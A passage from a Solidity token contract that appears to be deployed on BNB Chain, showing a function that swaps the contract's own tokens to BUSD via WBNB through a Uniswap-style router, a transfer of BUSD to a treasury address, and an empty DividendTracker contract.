        IERC20(BUSD).transfer(treasury, IERC20(BUSD).balanceOf(address(this)));
    }

    function callSwapTokensToBUSD(uint256 tokenAmount) private {

        address[] memory path;
        path = new address[](3);
        path[0] = address(this);
        path[1] = WBNB;
        path[2] = BUSD;

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        //IERC20(WBNB).approve(address(uniswapV2Router), 2**256 - 1);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

}

contract DividendTracker {
}